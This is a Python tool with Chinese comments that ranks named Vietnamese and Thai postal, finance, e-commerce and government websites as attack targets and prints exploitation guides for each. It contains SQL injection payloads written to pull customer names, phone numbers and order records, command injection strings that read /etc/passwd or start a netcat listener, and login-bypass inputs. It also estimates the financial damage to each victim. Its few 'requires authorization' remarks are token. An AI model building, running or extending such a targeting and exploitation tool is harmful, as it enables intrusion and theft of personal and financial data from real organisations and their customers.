"""
漏洞目标分析与智能利用工具（简化版本）
基于概率分析选择最优目标并提供利用方法
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class TargetInfo:
    """目标信息"""
    name: str
    url: str
    country: str
    sector: str
    risk_level: str
    success_probability: float
    vulnerability_types: List[str]
    priority_score: int
    note: Optional[str] = None
    last_tested: Optional[str] = None
    test_result: Optional[str] = None

@dataclass
class ExploitResult:
    """利用结果"""
    target: str
    vulnerability_type: str
    success: bool
    evidence: str
    data_extracted: List[str]
    financial_impact: str
    execution_time: float

class TargetAnalyzer:
    """目标分析器"""

    def __init__(self):
        self.targets = []
        self.high_priority_targets = []

        # 基于分析的高价值目标数据库
        self.target_database = [
            # 越南高概率目标
            TargetInfo(
                name="NetPost Vietnam",
                url="https://netpost.vn",
                country="Vietnam",
                sector="Logistics",
                risk_level="HIGH",
                success_probability=0.67,
                vulnerability_types=["SQL Injection", "Time-based Blind", "Data Extraction"],
                priority_score=95
            ),
            TargetInfo(
                name="Viettel Post Portal",
                url="https://viettelpost.com.vn",
                country="Vietnam",
                sector="Logistics",
                risk_level="HIGH",
                success_probability=0.60,
                vulnerability_types=["SQL Injection", "Order Manipulation", "API Testing"],
                priority_score=90
            ),
            TargetInfo(
                name="VNPost System",
                url="https://vnpost.vn",
                country="Vietnam",
                sector="Logistics",
                risk_level="MEDIUM",
                success_probability=0.45,
                vulnerability_types=["SQL Injection", "Payment Bypass", "Command Injection"],
                priority_score=80
            ),
            # 泰国高价值目标
            TargetInfo(
                name="Thai Finance Gateway",
                url="https://thaifinance.paygw.com",
                country="Thailand",
                sector="Finance",
                risk_level="CRITICAL",
                success_probability=0.75,
                vulnerability_types=["SQL Injection", "API Security", "Authentication Bypass"],
                priority_score=100
            ),
            TargetInfo(
                name="Thai E-commerce Platform",
                url="https://shop.thailandmall.com",
                country="Thailand",
                sector="E-commerce",
                risk_level="HIGH",
                success_probability=0.55,
                vulnerability_types=["XSS", "SQL Injection", "CSRF", "Session Hijacking"],
                priority_score=85
            ),
            # 政府网站（高价值但需要授权）
            TargetInfo(
                name="Vietnamese Customs",
                url="https://customs.gov.vn",
                country="Vietnam",
                sector="Government",
                risk_level="CRITICAL",
                success_probability=0.70,
                vulnerability_types=["Authentication Bypass", "Privilege Escalation", "Data Breach"],
                priority_score=98,
                note="Requires explicit authorization"
            ),
            TargetInfo(
                name="Thai Gov Portal",
                url="https://egov.thaigov.com",
                country="Thailand",
                sector="Government",
                risk_level="CRITICAL",
                success_probability=0.65,
                vulnerability_types=["Authentication Bypass", "Session Hijacking", "Data Exfiltration"],
                priority_score=96,
                note="Requires explicit authorization"
            )
        ]

        # 漏洞利用payload库
        self.payload_library = {
            "SQL Injection": {
                "time_based_blind": [
                    "' WAITFOR DELAY '0:0:{delay}'--",
                    "' AND SLEEP({delay})--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--"
                ],
                "union_based": [
                    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                    "' UNION SELECT MaKH,TenKH,SoDienThoai,DiaChi,Email FROM KHACHHANG--",
                    "' UNION SELECT MaDon,TinhTrang,NgayDat,TongTien FROM DONHANG--"
                ],
                "error_based": [
                    "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                    "' AND 1=@@version--"
                ]
            },
            "Command Injection": {
                "windows": [
                    "id; whoami",
                    "| net user",
                    "& dir &",
                    "|| ping 127.0.0.1 ||"
                ],
                "linux": [
                    "id; whoami",
                    "| cat /etc/passwd",
                    "&& ls -la &&",
                    "|| nc -lvp 4444 ||"
                ]
            },
            "Authentication Bypass": [
                {"username": "' OR '1'='1", "password": "anything"},
                {"username": "admin'#", "password": ""},
                {"username": "' OR '1'='1'--", "password": ""}
            ]
        }

        # 成功率指示器
        self.success_indicators = {
            "SQL Injection": [
                "SQL syntax error",
                "mysql_fetch_array",
                "ORA-",
                "Microsoft JET Database",
                "SQLite",
                "PostgreSQL"
            ],
            "Data Extraction": [
                "MaKH", "TenKH", "SoDienThoai", "KHACHHANG",
                "MaDon", "TinhTrang", "DONHANG",
                "DA_THANH_TOAN", "THAT_BAI"
            ],
            "Command Injection": [
                "Administrator", "Users", "C:\\", "ping",
                "root", "bin", "etc", "home"
            ]
        }

    def calculate_impact(self, target: TargetInfo, vuln_type: str, data_count: int) -> str:
        """计算财务影响"""
        # 基于目标国家和漏洞类型计算影响
        vietnam_impacts = {
            "SQL Injection": "5亿越南盾",
            "Data Extraction": "3亿越南盾",
            "Order Manipulation": "8亿越南盾",
            "Payment Bypass": "无限损失"
        }

        thai_impacts = {
            "SQL Injection": "50亿泰铢",
            "API Security": "30亿泰铢",
            "Authentication Bypass": "40亿泰铢",
            "Data Breach": "25亿泰铢"
        }

        base_impact = vietnam_impacts.get(vuln_type, thai_impacts.get(vuln_type, "中等损失"))

        if data_count > 5:
            impact = f"{base_impact} (数据量大，影响严重)"
        elif data_count > 2:
            impact = f"{base_impact} (数据量中等，影响较大)"
        else:
            impact = f"{base_impact} (数据量较少，影响有限)"

        return impact

    def analyze_targets(self) -> List[TargetInfo]:
        """分析目标并按优先级排序"""
        logger.info("开始目标分析...")

        # 更新每个目标的优先级分数
        for target in self.target_database:
            # 基于风险等级和成功概率计算最终分数
            risk_multiplier = {"CRITICAL": 1.5, "HIGH": 1.2, "MEDIUM": 1.0, "LOW": 0.8}
            final_score = (target.success_probability * 100) * risk_multiplier[target.risk_level]
            target.priority_score = int(final_score)

        # 按优先级排序
        sorted_targets = sorted(self.target_database, key=lambda x: x.priority_score, reverse=True)

        # 分离高优先级目标
        self.high_priority_targets = [t for t in sorted_targets if t.priority_score >= 80]
        self.targets = sorted_targets

        logger.info(f"分析完成: 总目标 {len(sorted_targets)}, 高优先级 {len(self.high_priority_targets)}")
        return sorted_targets

    def get_target_by_name(self, name: str) -> Optional[TargetInfo]:
        """根据名称获取目标"""
        for target in self.target_database:
            if target.name == name:
                return target
        return None

    def get_targets_by_risk_level(self, risk_level: str) -> List[TargetInfo]:
        """根据风险等级获取目标"""
        return [t for t in self.target_database if t.risk_level == risk_level]

    def get_payload_for_vulnerability(self, vuln_type: str) -> List[str]:
        """获取指定漏洞类型的payload"""
        return self.payload_library.get(vuln_type, [])

    def get_exploit_methods(self, target: TargetInfo) -> Dict[str, Any]:
        """获取目标的利用方法和步骤"""
        exploit_methods = {}

        for vuln_type in target.vulnerability_types:
            methods = self.get_payload_for_vulnerability(vuln_type)
            exploit_methods[vuln_type] = {
                "payloads": methods,
                "success_indicators": self.success_indicators.get(vuln_type, []),
                "risk_level": target.risk_level,
                "expected_impact": self.calculate_impact(target, vuln_type, 0)
            }

        return exploit_methods

class ExploitEngine:
    """漏洞利用引擎（简化版）"""

    def __init__(self):
        self.analyzer = TargetAnalyzer()

    def generate_exploit_guide(self, target_name: str) -> Dict[str, Any]:
        """生成利用指南"""
        target = self.analyzer.get_target_by_name(target_name)
        if not target:
            return {"error": "Target not found"}

        return {
            "target_info": {
                "name": target.name,
                "url": target.url,
                "country": target.country,
                "sector": target.sector,
                "risk_level": target.risk_level,
                "success_probability": target.success_probability,
                "priority_score": target.priority_score
            },
            "exploit_methods": self.analyzer.get_exploit_methods(target),
            "exploitation_steps": self.generate_step_by_step_guide(target),
            "precautions": self.generate_precautions(target)
        }

    def generate_step_by_step_guide(self, target: TargetInfo) -> List[str]:
        """生成分步利用指南"""
        steps = []

        steps.append(f"=== {target.name} 利用步骤 ===")
        steps.append(f"目标URL: {target.url}")
        steps.append(f"风险等级: {target.risk_level}")
        steps.append(f"预期成功率: {target.success_probability:.1%}")
        steps.append("")

        for i, vuln_type in enumerate(target.vulnerability_types, 1):
            steps.append(f"{i}. {vuln_type} 利用:")
            methods = self.analyzer.get_payload_for_vulnerability(vuln_type)

            for j, payload in enumerate(methods[:3], 1):
                steps.append(f"   方法{j}: {str(payload)[:50]}...")

            success_indicators = self.analyzer.success_indicators.get(vuln_type, [])
            if success_indicators:
                steps.append(f"   成功指标: {', '.join(success_indicators[:3])}")
            steps.append("")

        return steps

    def generate_precautions(self, target: TargetInfo) -> List[str]:
        """生成注意事项"""
        precautions = []

        precautions.append("=== 注意事项 ===")

        if target.risk_level == "CRITICAL":
            precautions.append("!!! 风险等级极高，需特别谨慎 !!!")
            precautions.append("1. 确保拥有明确授权")
            precautions.append("2. 建议在测试环境进行")
            precautions.append("3. 避免造成业务中断")

        if target.sector == "Government":
            precautions.append("政府网站，需要特殊授权")

        precautions.append("建议在非工作时间进行测试")
        precautions.append("监控网络响应，避免过度负载")
        precautions.append("记录所有测试操作和结果")

        return precautions

def display_targets():
    """显示目标列表"""
    analyzer = TargetAnalyzer()
    sorted_targets = analyzer.analyze_targets()

    print("=" * 80)
    print("越南物流系统漏洞目标分析与利用指南")
    print("=" * 80)
    print("\n[高优先级目标]")

    for i, target in enumerate(sorted_targets[:5], 1):
        status_icon = "🔴" if target.risk_level == "CRITICAL" else "🟠" if target.risk_level == "HIGH" else "🟡"
        print(f"\n{i:2d}. {target.name}")
        print(f"    URL: {target.url}")
        print(f"    国家: {target.country} | 行业: {target.sector}")
        print(f"    风险等级: {target.risk_level} | 预期成功率: {target.success_probability:.1%}")
        print(f"    优先级分数: {target.priority_score}")
        print(f"    漏洞类型: {', '.join(target.vulnerability_types)}")
        if target.note:
            print(f"    备注: {target.note}")

    return analyzer

def main():
    """主函数"""

    print("正在启动漏洞目标分析工具...")

    # 显示目标列表
    analyzer = display_targets()

    print("\n" + "=" * 80)
    print("请选择要查看详细利用方法的目标:")
    print("=" * 80)

    # 显示选择菜单
    for i, target in enumerate(analyzer.targets[:5], 1):
        print(f"{i:2d}. {target.name} (风险: {target.risk_level}, 成功率: {target.success_probability:.1%})")

    print("  0. 查看所有目标详细分析")
    print("  q. 退出")

    while True:
        try:
            choice = input("\n请输入选择 (0-5/q): ").strip()

            if choice.lower() == 'q':
                print("退出程序")
                break

            if choice == '0':
                print("\n" + "=" * 60)
                print("所有目标详细分析")
                print("=" * 60)

                for target in analyzer.targets[:5]:
                    engine = ExploitEngine()
                    guide = engine.generate_exploit_guide(target.name)

                    print(f"\n[ {target.name} ]")
                    print("-" * 40)

                    # 显示利用方法
                    methods = guide["exploit_methods"]
                    for vuln_type, method_info in methods.items():
                        print(f"{vuln_type}:")
                        print(f"  Payloads: {len(method_info['payloads'])} 个")
                        print(f"  风险等级: {method_info['risk_level']}")
                        print(f"  预期影响: {method_info['expected_impact']}")

                    print("\n" + "-" * 40)

                break

            elif choice in ['1', '2', '3', '4', '5']:
                target_index = int(choice) - 1
                target = analyzer.targets[target_index]

                engine = ExploitEngine()
                guide = engine.generate_exploit_guide(target.name)

                print("\n" + "=" * 60)
                print(f"目标 {target.name} 详细利用指南")
                print("=" * 60)

                # 显示目标信息
                info = guide["target_info"]
                print(f"\n目标信息:")
                for key, value in info.items():
                    print(f"  {key}: {value}")

                # 显示利用步骤
                print("\n利用步骤:")
                for step in guide["exploitation_steps"]:
                    print(f"  {step}")

                # 显示注意事项
                print("\n注意事项:")
                for precaution in guide["precautions"]:
                    print(f"  {precaution}")

                break

            else:
                print("无效选择，请重新输入")

        except KeyboardInterrupt:
            print("\n用户中断，退出程序")
            break
        except Exception as e:
            print(f"错误: {e}")
            break

if __name__ == "__main__":
    main()